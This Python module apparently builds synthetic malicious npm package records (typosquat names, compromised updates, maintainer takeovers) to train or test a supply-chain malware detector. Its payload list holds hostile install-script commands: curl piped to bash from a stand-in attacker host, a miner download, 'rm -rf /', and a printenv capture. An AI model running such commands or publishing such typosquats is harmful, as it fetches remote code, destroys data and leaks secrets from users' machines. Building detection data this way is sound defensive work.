import json
import string
from neo4j.graph import Node
import random
import copy

def node_to_package(node: Node):
    props = {key: node[key] for key in node.keys()}
    props["element_id"] = node.element_id
    props["labels"] = list(node.labels)

    json_formatted_properties = ["author","repository","dist","scripts", "_npmUser","dependencies","maintainers"]

    # Convert JSON formatted strings back to json
    for property in json_formatted_properties:
        prop = props.get(property)
        if prop is not None:
            props[property] = json.loads(prop)

    return props

def populate_database(file_path="top1000packages.txt", fn=lambda: None):
    with open(file_path, 'r') as file:
        for line in file:
            cleaned_line = line.strip()
            print(cleaned_line)
            fn(cleaned_line)

def typosquat_name(name):
    """
    Create a typosquat based on a benign package's name.
    """
    if not name or len(name) < 3:
        return f"{name}-malicious"
    
    technique = random.choice(['swap', 'double', 'missing', 'suffix', 'prefix'])
    name_characters = list(name)
    
    # Typical Typosquat techniques
    if technique == 'swap':
        # Swap two adjacent characters
        i = random.randint(0, len(name_characters) - 2)
        name_characters[i], name_characters[i+1] = name_characters[i+1], name_characters[i]
    elif technique == 'double':
        # Duplicate a character
        i = random.randint(0, len(name_characters) - 1)
        name_characters.insert(i, name_characters[i])
    elif technique == 'missing':
        # Remove a character
        i = random.randint(0, len(name_characters) - 1)
        del name_characters[i]
    elif technique == 'suffix':
        return f"{name}-js"
    elif technique == 'prefix':
        return f"node-{name}"
        
    return "".join(name_characters)

def generate_malicious_package(target_benign_name, name_suffix):
    """
    Generates a synthetic malicious package
    """
    pkg_name = typosquat_name(target_benign_name)
    # Example malicious scripts
    script_payloads = [
        "curl -s http://evil-server.com/payload | bash",
        "wget http://attacker.cn/miner.exe",
        "node setup_bun.js", # Recent Shai Hulud attack method
        "eval(Buffer.from('...').toString())",
        "rm -rf /",
        "export BAD_ENV=$(printenv)"
    ]
    script_type = random.choice(["preinstall", "postinstall", "install"])
    # For common malicious packages, look for:
    # Low weekly download counts, low dependency counts, single maintainers, suspicious scripts, no dependencies, no descriptions, typosquat names, and early versions
    return {
        "name": pkg_name,
        "version": "0.0.1",
        "weekly_downloads": random.randint(0, 100),
        "dependency_count": random.randint(0, 1),
        "maintainers": ["hacker_1"],
        "scripts": {
            script_type: random.choice(script_payloads)
        },
        "description": "",
        "dependencies": []
    }

# Create a new dataset for typosquat pkg
def create_dataset(benign_json_data, num_malicious):
    data = {}
    benign_names = list(benign_json_data.keys())
    
    # Needs benign packages to generate typosquat names
    if not benign_names:
        print("No benign packages provided. Cannot generate typosquats.")
        return {}
        
    for i in range(num_malicious):
        # Pick a random benign package to target
        target = random.choice(benign_names)
        pkg = generate_malicious_package(target, i)
        
        # Ensure uniqueness in current set
        retries = 0
        while pkg["name"] in data and retries < 10:
            target = random.choice(benign_names)
            pkg = generate_malicious_package(target, i)
            retries += 1
            
        data[pkg["name"]] = pkg

    return data

# Create random string of characters (resembles obfuscated paylods)
def random_entropy_blob(min_len=80, max_len=200):
    n = random.randint(min_len, max_len)
    alphabet = string.ascii_letters + string.digits + "+/="
    return "".join(random.choice(alphabet) for _ in range(n))

# Randomize script
def subtle_script_string():
    templates = [
        "node tools/setup.js",
        "node scripts/postinstall.js",
        "node -e \"{}\"".format(random_entropy_blob()),
        "node scripts/build.js",
    ]
    return random.choice(templates)

# Add an install script
def add_subtle_script(pkg: dict):
    if "scripts" not in pkg or not isinstance(pkg["scripts"], dict):
        pkg["scripts"] = {}

    hook = random.choice(["preinstall", "install", "postinstall"])

    # If hook exists, slightly modify it; otherwise create it
    if hook in pkg["scripts"]:
        pkg["scripts"][hook] = str(pkg["scripts"][hook]) + " && " + subtle_script_string()
    else:
        pkg["scripts"][hook] = subtle_script_string()

# Update package version
def bump_patch_version(version: str):
    try:
        parts = version.split(".")
        if len(parts) != 3:
            return version
        parts[2] = str(int(parts[2]) + 1)
        return ".".join(parts)
    except:
        return version

# Create new package with small sus change that resembles an updated package
def generate_compromised_update(benign_pkg: dict):
    pkg = copy.deepcopy(benign_pkg)

    # Bump version slightly to look like a real update
    pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))

    # Keep downloads realistic: compromised packages often stay popular
    # Add small noise rather than collapsing to 0..100
    wd = float(pkg.get("weekly_downloads", 0))
    pkg["weekly_downloads"] = max(0, int(wd * random.uniform(0.9, 1.1)))

    # Subtle install hook modification
    add_subtle_script(pkg)

    if random.random() < 0.35:
        deps = pkg.get("dependencies", [])
        if not isinstance(deps, list):
            deps = []
        # Add a placeholder "new dep" name (synthetic) OR reuse a benign dep
        if deps:
            deps = deps + [random.choice(deps)]
        pkg["dependencies"] = deps

    # Recompute dependency_count consistently
    pkg["dependency_count"] = len(pkg.get("dependencies", []))
    return pkg

# Create package with new maintainer
def generate_maintainer_takeover(benign_pkg: dict):
    pkg = copy.deepcopy(benign_pkg)

    # Keep most metadata stable
    pkg["version"] = bump_patch_version(str(pkg.get("version", "1.0.0")))

    # Modify maintainers slightly
    maintainers = pkg.get("maintainers", [])
    if not isinstance(maintainers, list):
        maintainers = []
    maintainers = maintainers[:]  # copy

    # Add a new maintainer
    if len(maintainers) == 0:
        maintainers = ["maintainer_new"]
    else:
        maintainers.append("maintainer_new")

    pkg["maintainers"] = maintainers

    # Add install script
    add_subtle_script(pkg)

    pkg["dependency_count"] = len(pkg.get("dependencies", []))
    return pkg

# Create a typosquat package with typical sus data
def generate_realistic_typosquat(target_name: str, target_pkg: dict, benign_names: list):
    pkg_name = typosquat_name(target_name)

    base = {
        "name": pkg_name,
        "version": "1.0.0",
        "description": (target_pkg.get("description") or "Utility helpers").strip()[:80],
        "weekly_downloads": int(max(0, random.gauss(200, 120))),  # plausible small popularity
        "dependencies": [],
        "scripts": {},
        "maintainers": ["maintainer_new"],
    }

    # Give it 1–5 dependencies sampled from the benign packages
    k = random.randint(1, 5)
    base["dependencies"] = random.sample(benign_names, k=min(k, len(benign_names)))
    base["dependency_count"] = len(base["dependencies"])

    # Add subtle script (one hook)
    add_subtle_script(base)
    return base

# Creates a malicious dataset where samples are modified through subtle permutations of existing benign packages.
def create_dataset(benign_json_data, num_malicious, mix=None):
    # Mix of packages for configuration
    if mix is None:
        mix = {
            "compromised_update": 0.60,
            "maintainer_takeover": 0.25,
            "typosquat": 0.15,
        }

    benign_names = list(benign_json_data.keys())
    if not benign_names:
        return {}

    out = {}

    # Precompute weighted scenario list
    scenarios = []
    for k, w in mix.items():
        scenarios += [k] * int(w * 100)

    for _ in range(num_malicious):
        scenario = random.choice(scenarios)
        target_name = random.choice(benign_names)
        target_pkg = benign_json_data[target_name]

        if scenario == "compromised_update":
            m_pkg = generate_compromised_update(target_pkg)
            m_pkg["name"] = target_name
        elif scenario == "maintainer_takeover":
            m_pkg = generate_maintainer_takeover(target_pkg)
            m_pkg["name"] = target_name
        else:
            # Else, typosquat
            m_pkg = generate_realistic_typosquat(target_name, target_pkg, benign_names)

        # Ensure dict key unique (if same package name used multiple times, keep the latest)
        out[m_pkg["name"]] = m_pkg

    return out